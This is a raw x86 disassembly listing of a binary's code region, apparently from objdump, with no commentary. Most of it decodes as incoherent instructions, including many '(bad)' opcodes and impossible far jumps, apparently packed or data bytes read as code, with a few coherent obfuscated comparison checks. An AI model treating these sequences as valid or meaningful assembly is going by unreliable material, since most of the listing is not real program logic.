  411958:	bound  esp,QWORD PTR [ebx-0x34]
  41195b:	test   eax,0xe1a37410
  411960:	jmp    0xc69a:0xfbb89da9
  411967:	es loopne 0x411944
  41196a:	pop    ds
  41196b:	mov    ah,BYTE PTR fs:[ecx+0x2c]
  41196f:	outs   dx,BYTE PTR ds:[esi]
  411970:	scas   al,BYTE PTR es:[edi]
  411971:	cli    
  411972:	push   ss
  411973:	mov    ah,0xa5
  411975:	imul   eax,DWORD PTR [ebx+0x5d],0xffffffb7
  411979:	and    al,0xb4
  41197b:	inc    esi
  41197c:	rol    edi,1
  41197e:	xchg   ecx,eax
  41197f:	in     al,0x7e
  411981:	iret   
  411982:	cli    
  411983:	cmp    DWORD PTR [ebx],ecx
  411985:	and    DWORD PTR [ecx+0x11],ebp
  411988:	mov    cl,0x1e
  41198a:	call   0x291a8ba4
  41198f:	mov    ebp,0xfc1600a1
  411994:	or     DWORD PTR [ebp+0xbf07b7],eax
  41199a:	and    eax,0x4636c2ca
  41199f:	cli    
  4119a0:	pop    ss
  4119a1:	jmp    0x411a18
  4119a3:	jmp    0x411936
  4119a5:	call   0x8a7c5d
  4119aa:	in     eax,0x9a
  4119ac:	and    DWORD PTR [ebx-0x70],0x28c2107f
  4119b3:	sbb    al,BYTE PTR [ecx+0x63]
  4119b6:	mov    edi,0x81c4558b
  4119bb:	icebp  
  4119bc:	cmp    cl,BYTE PTR [edi]
  4119be:	add    BYTE PTR [eax],al
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422558
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7c73e953
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	xlat   BYTE PTR ds:[ebx]
  411a15:	sbb    al,BYTE PTR [ebp+0x95bfede]
  411a1b:	push   ds
  411a1c:	cld    
  411a1d:	mov    esp,0x1d00b850
  411a22:	loope  0x411a04
  411a24:	xor    al,0x7f
  411a26:	mov    ds:0x1f4cfdb4,eax
  411a2b:	rcl    DWORD PTR [edi-0x50f00a27],cl
  411a31:	pushf  
  411a32:	cmc    
  411a33:	fs dec edx
  411a35:	sbb    al,0xac
  411a37:	(bad)  
  411a38:	jne    0x4119d7
  411a3a:	loopne 0x411a14
  411a3c:	stos   DWORD PTR es:[edi],eax
  411a3d:	and    al,0xe6
  411a3f:	bound  esp,QWORD PTR ds:0x7a5937a0
  411a45:	mov    ebx,0xd7763384
  411a4a:	div    DWORD PTR [ecx+0x5d]
  411a4d:	or     al,0x13
  411a4f:	xchg   esi,eax
  411a50:	in     al,dx
  411a51:	xchg   ecx,eax
  411a52:	sbb    DWORD PTR [edi],esp
  411a54:	sbb    ah,cl
  411a56:	mov    ds:0x45404737,eax
  411a5b:	pop    edx
  411a5c:	int3   
  411a5d:	pusha  
  411a5e:	xchg   edi,esp
  411a60:	outs   dx,DWORD PTR ds:[esi]
  411a61:	mov    BYTE PTR [edi],al
  411a63:	mov    cs,esp
  411a65:	lahf   
  411a66:	ror    al,0x80
  411a69:	test   al,0xf
  411a6b:	push   ss
  411a6c:	outs   dx,BYTE PTR ds:[esi]
  411a6d:	xor    BYTE PTR [esi],ch
  411a6f:	dec    edi
  411a70:	lods   al,BYTE PTR ds:[esi]
  411a71:	jmp    0x411a7e
  411a73:	(bad)  
  411a74:	ins    BYTE PTR es:[edi],dx
  411a75:	and    ah,BYTE PTR [eax+0x7ba32bfd]
  411a7b:	and    al,0xc6
  411a7d:	add    al,BYTE PTR [edi]
  411a7f:	sbb    BYTE PTR [ebp+0x7],cl
  411a82:	pushf  
  411a83:	inc    esp
  411a84:	lods   eax,DWORD PTR ds:[esi]
  411a85:	inc    ebx
  411a86:	add    ecx,0xffffffa4
  411a89:	mov    eax,0xab1c082c
  411a8e:	pop    esi
  411a8f:	jae    0x411a66
  411a91:	arpl   bx,sp
  411a93:	push   esi
  411a94:	or     al,0x11
  411a96:	sub    ebx,DWORD PTR [ecx-0x5b]
  411a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9a:	mov    ds:0xe0961eb6,al
  411a9f:	ss popa 
  411aa1:	(bad)  
  411aa2:	rcl    BYTE PTR [ebp+0x5bb72ccb],cl
  411aa8:	lds    eax,FWORD PTR [edx]
  411aaa:	pushf  
  411aab:	adc    esi,DWORD PTR [edx-0x6cedb9cb]
  411ab1:	loop   0x411b03
  411ab3:	int3   
  411ab4:	sbb    edi,eax
  411ab6:	dec    eax
  411ab7:	xchg   ebp,eax
  411ab8:	add    ebx,DWORD PTR [esi+ecx*8]
  411abb:	lods   eax,DWORD PTR ds:[esi]
  411abc:	pop    esp
  411abd:	inc    edi
  411abe:	jecxz  0x411a5d
  411ac0:	rcl    DWORD PTR [eax-0x2c],cl
  411ac3:	cmp    ebp,esp
  411ac5:	dec    edx
  411ac6:	xchg   esp,eax
  411ac7:	cmp    BYTE PTR [ecx+0x8505480],0x29
  411ace:	fst    st(0)
  411ad0:	call   0x4036:0x61ef8559
  411ad7:	xor    BYTE PTR [eax],0x8a
  411ada:	or     ebp,DWORD PTR [ebx]
  411adc:	aam    0xff
  411ade:	jecxz  0x411a63
  411ae0:	xchg   al,dh
  411ae2:	retf   
  411ae3:	mov    eax,0xc88203cd
  411ae8:	ins    DWORD PTR es:[edi],dx
  411ae9:	jg     0x411af5
  411aeb:	scas   al,BYTE PTR es:[edi]
  411aec:	pop    eax
  411aed:	adc    DWORD PTR [ebx-0x54],edi
  411af0:	shl    BYTE PTR [esp+eiz*4],cl
  411af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411af4:	inc    esi
  411af5:	push   ecx
  411af6:	ja     0x411a8d
  411af8:	mov    ds:0x59770b97,eax
  411afd:	inc    edx
  411afe:	aas    
  411aff:	popf   
  411b00:	or     bh,BYTE PTR [ecx]
  411b02:	(bad)  
  411b03:	loop   0x411b6c
  411b05:	xor    eax,0xc2bd7ce9
  411b0a:	sbb    dh,BYTE PTR [esi-0x6522d78e]
  411b10:	dec    eax
  411b11:	lock fstp TBYTE PTR [esi+edx*4]
  411b15:	or     BYTE PTR [edx-0x6a77e91b],ch
  411b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b1c:	retf   
  411b1d:	push   ebx
  411b1e:	mov    esp,0x970d23a4
  411b23:	scas   al,BYTE PTR es:[edi]
  411b24:	jmp    0x411ac7
  411b26:	sub    al,0xa2
  411b28:	mov    dl,0xdd
  411b2a:	and    al,0xfd
  411b2c:	mov    dl,0x43
  411b2e:	into   
  411b2f:	call   0xd7e4:0x56a8ae36
  411b36:	daa    
  411b37:	push   esi
  411b38:	ja     0x411abd
  411b3a:	xchg   edx,eax
  411b3b:	pusha  
  411b3c:	sbb    DWORD PTR [ebx],esi
  411b3e:	mov    cl,BYTE PTR [esi-0x48]
  411b41:	mov    ds:0xf6387970,al
  411b46:	xchg   ebx,eax
  411b47:	mov    cl,0x3c
  411b49:	push   ebp
  411b4a:	cdq    
  411b4b:	add    al,dl
  411b4d:	nop
  411b4e:	out    dx,eax
  411b4f:	sub    al,0x8b
  411b51:	adc    BYTE PTR [ebp+0x6e],cl
  411b54:	iret   
  411b55:	jnp    0x411b9c
  411b57:	rcr    BYTE PTR [ebp+0x36fd525],cl
  411b5d:	lds    ecx,FWORD PTR [eax+0x27]
  411b60:	xor    al,0x2c
  411b62:	sub    bh,BYTE PTR [ebx-0x6c15cfb8]
  411b68:	pop    ss
  411b69:	and    BYTE PTR [esi],ah
  411b6b:	scas   eax,DWORD PTR es:[edi]
  411b6c:	xchg   esi,eax
  411b6d:	sahf   
  411b6e:	mov    dh,0xed
  411b70:	call   0x97205c18
  411b75:	nop
  411b76:	pop    es
  411b77:	xchg   ecx,eax
  411b78:	outs   dx,DWORD PTR ds:[esi]
  411b79:	or     DWORD PTR [edi],ebp
  411b7b:	sar    ch,1
  411b7d:	mov    ds,WORD PTR [eax]
  411b7f:	adc    eax,0x6e937e7e
  411b84:	or     eax,0x454cab66
  411b89:	jb     0x411bf7
  411b8b:	jno    0x411bcb
  411b8d:	aam    0x7a
  411b8f:	cdq    
  411b90:	inc    ebp
  411b91:	mov    cl,0xe
  411b93:	pop    ebx
  411b94:	test   cl,0x11
  411b97:	adc    eax,0x8a8d61b2
  411b9c:	loop   0x411bdd
  411b9e:	jmp    0xb6df:0xf4629b40
  411ba5:	inc    eax
  411ba6:	or     BYTE PTR [ecx-0x64dc6839],cl
  411bac:	int    0x84
  411bae:	je     0x411b90
  411bb0:	push   es
  411bb1:	sub    dh,cl
  411bb3:	ins    DWORD PTR es:[edi],dx
  411bb4:	pushf  
  411bb5:	jb     0x411b46
  411bb7:	aaa    
  411bb8:	jmp    0x411be0
  411bba:	adc    edx,eax
  411bbc:	icebp  
  411bbd:	pop    ebx
  411bbe:	mov    cl,dh
  411bc0:	inc    esp
  411bc1:	inc    eax
  411bc2:	or     eax,0x7dee427d
  411bc7:	push   ss
  411bc8:	pop    ecx
  411bc9:	adc    BYTE PTR [ebp-0x3406401f],dh
  411bcf:	jae    0x411be8
  411bd1:	push   0x3bd2d63f
  411bd6:	cld    
  411bd7:	cmp    DWORD PTR [eax+edi*4-0x13],esi
  411bdb:	repnz ins BYTE PTR es:[edi],dx
  411bdd:	and    eax,DWORD PTR [ebp-0x7dbcd4af]
  411be3:	test   eax,0x3855967b
  411be8:	push   es
  411be9:	aad    0x9c
  411beb:	pop    ecx
  411bec:	outs   dx,BYTE PTR ds:[esi]
  411bed:	ret    0xf231
  411bf0:	push   esp
  411bf1:	and    esi,DWORD PTR [esp+eax*8]
  411bf4:	or     ah,bh
  411bf6:	lock sub ebx,ecx
  411bf9:	pop    esi
  411bfa:	xchg   esi,eax
  411bfb:	sub    BYTE PTR [bx+di+0x40],cl
  411bff:	ficom  WORD PTR [ebx]
  411c01:	popf   
  411c02:	retf   0x2d53
  411c05:	into   
  411c06:	or     al,0x25
  411c08:	xlat   BYTE PTR ds:[ebx]
  411c09:	and    eax,DWORD PTR [ebx+0x56]
  411c0c:	rcl    DWORD PTR [ecx+edx*1],1
  411c0f:	lods   eax,DWORD PTR ds:[esi]
  411c10:	push   edx
  411c11:	dec    esp
  411c12:	cld    
  411c13:	popf   
  411c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c15:	jo     0x411c58
  411c17:	mov    ah,0x9d
  411c19:	outs   dx,DWORD PTR ds:[esi]
  411c1a:	xchg   ebp,eax
  411c1b:	and    esp,DWORD PTR ds:0x6071
  411c20:	jmp    0x34f52766
  411c25:	inc    esi
  411c26:	adc    ah,bh
  411c28:	cmp    ah,ah
  411c2a:	and    eax,0x86926b16
  411c2f:	xor    ebp,ebx
  411c31:	or     al,BYTE PTR [ebx]
  411c33:	push   esi
  411c34:	test   al,dl
  411c36:	mov    esi,0x5295fb4d
  411c3b:	sahf   
  411c3c:	hlt    
  411c3d:	mov    edx,0x66e01fd5
  411c42:	ror    DWORD PTR [eax+ecx*1+0x62],1
  411c46:	xor    DWORD PTR [edx-0x9],edi
  411c49:	mov    ebp,0x23518a42
  411c4e:	push   ss
  411c4f:	repnz and BYTE PTR [ecx+0x71],dl
  411c53:	test   DWORD PTR [esp+ebx*1],ecx
  411c56:	dec    ebp
  411c57:	mov    al,BYTE PTR [ebx+0x71]
  411c5a:	inc    eax
  411c5b:	push   ds
  411c5c:	dec    edx
  411c5d:	sub    al,0x96
  411c5f:	mov    ds:0xb3fcd9ac,eax
  411c64:	iret   
  411c65:	popa   
  411c66:	pop    edi
  411c67:	pusha  
  411c68:	(bad)
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x29fc6a08]
  411c98:	jecxz  0x411c44
  411c9a:	dec    edi
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	icebp  
  411ca3:	sbb    eax,0x94532943
  411ca8:	jl     0x411ce1
  411caa:	(bad)  
  411cab:	cmp    ch,BYTE PTR [eax]
  411cad:	test   DWORD PTR [esi+0x57efecce],0x13d1a28c
  411cb7:	or     al,dh
  411cb9:	lods   al,BYTE PTR ds:[esi]
  411cba:	popf   
  411cbb:	and    BYTE PTR [edi+0x7f76fa16],bh
  411cc1:	add    eax,0x2a32c277
  411cc6:	retf   
  411cc7:	call   0xe6cc:0x1cf882ec
  411cce:	xchg   edi,eax
  411ccf:	add    DWORD PTR [esi-0x27],0xb5b73fff
  411cd6:	jl     0x411c6f
  411cd8:	sbb    BYTE PTR ss:[ecx],al
  411cdb:	xchg   ebx,eax
  411cdc:	cmp    BYTE PTR [edx+0x0],dh
  411cdf:	jmp    0x411ceb
  411ce1:	xor    al,0xf1
  411ce3:	xlat   BYTE PTR ds:[ebx]
  411ce4:	sbb    eax,0x2c6c3a3d
  411ce9:	scas   al,BYTE PTR es:[edi]
  411cea:	dec    esp
  411ceb:	sub    eax,0x9755b31
  411cf0:	leave  
  411cf1:	adc    BYTE PTR [esi-0x33e13ca2],cl
  411cf7:	aas    
  411cf8:	jne    0x411d6d
  411cfa:	add    BYTE PTR [eax+0x13d0b6ff],bh
  411d00:	dec    ebx
  411d01:	jmp    0xe420:0xe3ab3e5e
  411d08:	mov    cl,0xfe
  411d0a:	add    al,ch
  411d0c:	addr16 fwait
  411d0e:	js     0x411c94
  411d10:	sbb    al,0xfa
  411d12:	dec    edx
  411d13:	lods   al,BYTE PTR ds:[esi]
  411d14:	mov    ecx,0xed35f8b8
  411d19:	xchg   DWORD PTR [ecx+0x2a],eax
  411d1c:	loope  0x411ca7
  411d1e:	shl    BYTE PTR [eax-0x7e1cf749],1
  411d24:	call   edx
  411d26:	out    0x9f,eax
  411d28:	mov    ebx,0xe44129b8
  411d2d:	push   ss
  411d2e:	adc    DWORD PTR [edi+0x6d],esp
  411d31:	stos   BYTE PTR es:[edi],al
  411d32:	and    BYTE PTR [ebx+0x17],cl
  411d35:	cdq    
  411d36:	push   eax
  411d37:	inc    DWORD PTR [ecx]
  411d39:	nop
  411d3a:	out    0x26,al
  411d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d3d:	ds ret 0x9534
  411d41:	inc    eax
  411d42:	stos   DWORD PTR es:[edi],eax
  411d43:	dec    ebx
  411d44:	aad    0x70
  411d46:	ror    ecx,0x1c
  411d49:	aas    
  411d4a:	add    cl,BYTE PTR [eax+eiz*1-0x28]
  411d4e:	fstp   TBYTE PTR [ebp-0x38]
  411d51:	mov    bl,0x19
  411d53:	add    eax,0x4e5f8995
  411d58:	test   DWORD PTR [esi-0x43],esi
  411d5b:	shr    BYTE PTR ds:0xe5a2faea,0x62
  411d62:	(bad)  
  411d63:	xor    DWORD PTR [esi+0x50],esp
  411d66:	scas   al,BYTE PTR es:[edi]
  411d67:	loope  0x411d18
  411d69:	pop    edi
  411d6a:	in     al,dx
  411d6b:	stos   BYTE PTR es:[edi],al
  411d6c:	xchg   edx,eax
  411d6d:	int    0xd4
  411d6f:	retf   0x2cd2
  411d72:	pop    ebx
  411d73:	test   DWORD PTR [ecx+ebp*1],esi
  411d76:	mov    dh,0x97
  411d78:	pop    ss
  411d79:	ja     0x411de3
  411d7b:	fcomp  QWORD PTR [ecx]
  411d7d:	leave  
  411d7e:	cs inc edi
  411d80:	pop    eax
  411d81:	aas    
  411d82:	aam    0xae
  411d84:	loop   0x411df4
  411d86:	jle    0x411d09
  411d88:	out    0x68,eax
  411d8a:	xchg   esp,eax
  411d8b:	(bad)  
  411d8c:	adc    eax,0x57f2f653
  411d91:	or     BYTE PTR [ebx],ch
  411d93:	(bad)  
  411d95:	mov    bl,0x9
  411d97:	jge    0x411d7e
  411d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d9a:	adc    DWORD PTR [ebp+0x18f2cc17],esi
  411da0:	dec    DWORD PTR [ebx+0x20deb185]
  411da6:	test   eax,0x52433aba
  411dab:	push   ebp
  411dac:	lds    esi,FWORD PTR [ebx-0x18da689d]
  411db2:	push   0x79
  411db4:	dec    ebx
  411db5:	loope  0x411d46
  411db7:	xchg   edi,eax
  411db8:	addr16 ss jmp 0xbf1792a4
  411dbf:	(bad)  
  411dc0:	pop    eax
  411dc1:	fwait
  411dc2:	sub    eax,0xb7320098
  411dc7:	mov    ah,0x1
  411dc9:	and    ebp,DWORD PTR [edx+esi*2+0x4e55ee81]
  411dd0:	scas   al,BYTE PTR es:[edi]
  411dd1:	sar    edi,0x67
  411dd4:	mov    ds:0x4704a3c9,eax
  411dd9:	in     al,dx
  411dda:	adc    bl,BYTE PTR ss:[ebx+ebp*1]
  411dde:	push   edi
  411ddf:	popa   
  411de0:	push   edx
  411de1:	sub    BYTE PTR [edi-0x1b],bh
  411de4:	or     BYTE PTR [ebp+0x3a],cl
  411de7:	xor    DWORD PTR [edi-0x38],ebp
  411dea:	retf   0x28c9
  411ded:	or     ecx,ebp
  411def:	mov    DWORD PTR [esi+0x2ef1acec],esi
  411df5:	jmp    FWORD PTR [eax+0x405282f2]
  411dfb:	or     eax,0x1c4b67db
  411e00:	and    ebp,DWORD PTR [eax+0x4f]
  411e03:	dec    esi
  411e04:	pop    ecx
  411e05:	stc    
  411e06:	push   edi
  411e07:	jg     0x411d8a
  411e09:	jno    0x411e7a
  411e0b:	pop    ss
  411e0c:	in     al,dx
  411e0d:	cdq    
  411e0e:	loope  0x411e4b
  411e10:	je     0x411dca
  411e12:	(bad)  
  411e13:	jae    0x411e36
  411e15:	popa   
  411e16:	xor    DWORD PTR [esi-0x60],edi
  411e19:	std    
  411e1a:	add    al,0xfa
  411e1c:	test   al,0x51
  411e1e:	push   ecx
  411e1f:	mov    edi,0x7657bc4a
  411e24:	int    0x0
  411e26:	out    0xc6,eax
  411e28:	loopne 0x411e74
  411e2a:	push   esp
  411e2b:	cmp    DWORD PTR [esi],esp
  411e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e2e:	jge    0x411e4e
  411e30:	push   es
  411e31:	mov    eax,ds:0xe3973e56
  411e36:	scas   eax,DWORD PTR es:[edi]
  411e37:	iret   
  411e38:	push   ds
  411e39:	xchg   edi,eax
  411e3a:	mov    ah,0x72
  411e3c:	out    dx,al
  411e3d:	sub    edx,DWORD PTR [ebp+edx*8-0x1e]
  411e41:	out    0xe3,al
  411e43:	adc    dl,0xec
  411e46:	nop
  411e47:	push   es
  411e48:	icebp  
  411e49:	jnp    0x411e06
  411e4b:	pop    ebx
  411e4c:	pop    ebp
  411e4d:	mov    esp,0xe799d604
  411e52:	popa   
  411e53:	out    dx,eax
  411e54:	aad    0x7b
  411e56:	sub    esi,DWORD PTR [ecx+edx*8]
  411e59:	and    eax,0x4e9f3688
  411e5e:	int3   
  411e5f:	add    cl,ch
  411e61:	cwde   
  411e62:	pop    es
  411e63:	das    
  411e64:	aad    0x9f
  411e66:	mov    al,0xa1
  411e68:	xor    eax,0x31dfd519
  411e6d:	lds    ebx,FWORD PTR [bp+di+0x1dc7]
  411e72:	jae    0x411e86
  411e74:	mov    edi,0xffed539c
  411e79:	leave  
  411e7a:	xor    DWORD PTR [ecx+0x10],0x1a
  411e7e:	lods   al,BYTE PTR ds:[esi]
  411e7f:	std    
  411e80:	xor    ch,BYTE PTR [edx+0x63]
  411e83:	mov    ebp,0x45a719b7
  411e88:	xchg   esp,eax
  411e89:	in     eax,dx
  411e8a:	jg     0x411f0a
  411e8c:	(bad)  
  411e8d:	mov    cl,0x8a
  411e8f:	shr    esi,cl
  411e91:	cmp    eax,0xc4159942
  411e96:	(bad)  [ecx-0x59]
  411e99:	pop    eax
  411e9a:	pop    edi
  411e9b:	out    dx,al
  411e9c:	fstp   QWORD PTR [edx-0x1615f48d]
  411ea2:	xlat   BYTE PTR ds:[ebx]
  411ea3:	lods   eax,DWORD PTR ds:[esi]
  411ea4:	mov    ch,0x5f
  411ea6:	push   ebx
  411ea7:	fdivr  DWORD PTR [ebp+0x1a69c089]
  411ead:	mov    cl,0x2d
  411eaf:	inc    esi
  411eb0:	fistp  QWORD PTR [edi-0x1b]
  411eb3:	or     al,0x2
  411eb5:	xor    eax,0xa79ac49d
  411eba:	or     ebx,DWORD PTR [ecx]
  411ebc:	ins    BYTE PTR es:[edi],dx
  411ebd:	inc    ebp
  411ebe:	xlat   BYTE PTR ds:[ebx]
  411ebf:	mov    eax,ds:0xf1c11650
  411ec4:	cli    
  411ec5:	(bad)  
  411ec6:	bound  eax,QWORD PTR [ecx]
  411ec8:	fwait
  411ec9:	or     eax,0x18d0cedb
  411ece:	mov    eax,0xffbb20b9
  411ed3:	outs   dx,DWORD PTR ds:[esi]
  411ed4:	mov    dh,0x5b
  411ed6:	ss inc esp
  411ed8:	(bad)  
  411ed9:	mov    dl,0x2d
  411edb:	call   0xf512:0x17a964ab
  411ee2:	(bad)  
  411ee3:	sub    al,0x69
  411ee5:	sub    esp,edi
  411ee7:	pop    ebp
  411ee8:	xchg   esi,eax
  411ee9:	lock dec ecx
  411eeb:	je     0x411edd
  411eed:	mov    DWORD PTR [eax],ebx
  411eef:	sub    eax,0x54b284ab
  411ef4:	(bad)  [ebp-0x75]
  411ef7:	mov    ds:0xce0bc9fc,al
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422558
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225f4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225ec,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	repz dec ecx
  411fab:	imul   edi,DWORD PTR [esi+eiz*4+0x71181866],0x58181814
  411fb6:	mov    eax,ds:0x76e8df4b
  411fbb:	or     eax,0x56f16a19
  411fc0:	push   ebp
  411fc1:	xlat   BYTE PTR ds:[ebx]
  411fc2:	xor    BYTE PTR [esi],0xf6
  411fc5:	lock fistp WORD PTR [edx-0x11]
  411fc9:	popa   
  411fca:	inc    edi
  411fcb:	sub    cl,BYTE PTR [esi-0x7]
  411fce:	cli    
  411fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd0:	cmp    esi,DWORD PTR [edx+0x20]
  411fd3:	push   ebx
  411fd4:	dec    ebx
  411fd5:	es aam 0xd2
  411fd8:	clc    
  411fd9:	bound  esi,QWORD PTR [edx+eiz*2-0x4a339c9f]
  411fe0:	dec    esp
  411fe1:	sahf   
  411fe2:	retf   0xfd2
  411fe5:	sar    DWORD PTR [ebx-0x1b],cl
  411fe8:	add    ah,BYTE PTR [ebx+ecx*4]
  411feb:	dec    esi
  411fec:	cli    
  411fed:	retf   
  411fee:	pop    edi
  411fef:	sbb    bl,BYTE PTR [ebp+0x27]
  411ff2:	rcl    BYTE PTR [ebx+edx*4+0x6bcf82e0],0x8f
  411ffa:	jmp    0x41207a
  411ffc:	sbb    BYTE PTR [ebp+0x35b4fc04],0x84
  412003:	push   ebp
  412004:	xchg   edi,eax
  412005:	xor    ebx,0x12
  412008:	daa    
  412009:	pop    esi
  41200a:	cmp    esi,ebp
  41200c:	jmp    0x415c:0xc1e85b2e
  412013:	cmp    ecx,esi
  412015:	mov    ebx,0xb4d99523
  41201a:	add    BYTE PTR [edi],cl
  41201c:	and    al,0xf5
  41201e:	mov    ebx,0x612d67e1
  412023:	rcl    BYTE PTR [eax],cl
  412025:	sbb    al,0x60
  412027:	ss rcr ebx,cl
  41202a:	dec    DWORD PTR [edi-0x32]
  41202d:	int    0x86
  41202f:	mov    cs,edi
  412031:	out    0xd6,eax
  412033:	pop    ss
  412034:	jg     0x411fd4
  412036:	sbb    ch,BYTE PTR es:[ebx-0x28]
  41203a:	adc    ah,BYTE PTR [edx]
  41203c:	rol    esi,cl
  41203e:	mov    WORD PTR [edx-0x7df301ff],ds
  412044:	xor    eax,0xa4c98aaa
  412049:	inc    ebp
  41204a:	lods   al,BYTE PTR ds:[esi]
  41204b:	xchg   ebx,eax
  41204c:	in     eax,0x16
  41204e:	lods   al,BYTE PTR ds:[esi]
  41204f:	repz clc 
  412051:	loop   0x4120d0
  412053:	jbe    0x411fda
  412055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412056:	lock call 0xb498e653
  41205c:	mov    eax,ds:0x4c19563d
  412061:	sbb    DWORD PTR [esi-0x3be0498c],ecx
  412067:	sti    
  412068:	popf   
  412069:	push   0xac2501f9
  41206e:	xchg   ebx,eax
  41206f:	jp     0x412092
  412071:	mov    edx,0x75f6dccf
  412076:	retf   0xa788
  412079:	leave  
  41207a:	fist   DWORD PTR [edx-0x2f]
  41207d:	bound  ebx,QWORD PTR [edi-0x3d9151b3]
  412083:	cmp    dh,cl
  412085:	sub    ebx,DWORD PTR [edi]
  412087:	test   eax,0xe3a3fa46
  41208c:	or     DWORD PTR [ecx+ebp*1-0x2b],edx
  412090:	xor    bh,dh
  412092:	xor    al,0x7a
  412094:	enter  0x165e,0xc9
  412098:	inc    ebx
  412099:	shl    DWORD PTR [ebx],1
  41209b:	ins    DWORD PTR es:[edi],dx
  41209c:	das    
  41209d:	jp     0x412044
  41209f:	jecxz  0x4120b3
  4120a1:	je     0x4120d6
  4120a3:	mov    ch,0x66
  4120a5:	fwait
  4120a6:	imul   ecx,edx,0xb
  4120a9:	(bad)  
  4120aa:	pop    ecx
  4120ab:	dec    DWORD PTR [edi-0x4b]
  4120ae:	dec    eax
  4120af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120b0:	adc    BYTE PTR ds:0x666175dc,cl
  4120b6:	(bad)  
  4120b7:	(bad)  
  4120b8:	paddusb mm0,QWORD PTR [eax+0x5f10aad4]
  4120bf:	test   esp,ebp
  4120c1:	(bad)  
  4120c2:	sbb    dh,BYTE PTR [ebp-0x59fce6c9]
  4120c8:	imul   eax,edi,0xd9265c7e
  4120ce:	mov    ebx,0x5800b8a2
  4120d3:	or     eax,esi
  4120d5:	jmp    0xb35bddcb
  4120da:	cmp    DWORD PTR [ebx+0x434cb530],0xbb37aca5
  4120e4:	cld    
  4120e5:	sbb    eax,0x77c600de
  4120ea:	jg     0x41213b
  4120ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ed:	mov    ss,edi
  4120ef:	xchg   esi,eax
  4120f0:	push   0x7d
  4120f2:	push   eax
  4120f3:	mov    al,0xcc
  4120f5:	pop    ds
  4120f6:	mov    eax,0x3b36d24b
  4120fb:	sbb    ch,BYTE PTR [edx+0x27]
  4120fe:	sub    BYTE PTR [eax],0xda
  412101:	daa    
  412102:	xor    ecx,DWORD PTR es:[edx]
  412105:	loop   0x412091
  412107:	xchg   edi,eax
  412108:	das    
  412109:	(bad)  
  41210a:	dec    eax
  41210b:	push   0xfffffff0
  41210d:	mov    edi,0x3bebf8d0
  412112:	fs and edi,esi
  412115:	ja     0x412122
